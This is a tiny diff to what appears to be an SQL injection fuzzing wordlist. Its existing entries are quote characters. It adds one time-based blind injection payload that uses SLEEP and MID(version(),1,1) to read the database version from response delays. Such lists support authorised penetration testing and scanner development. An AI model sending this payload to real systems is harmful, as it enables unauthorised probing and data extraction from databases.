@@ -1,3 +1,4 @@
+'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
 '
 ''
 '''
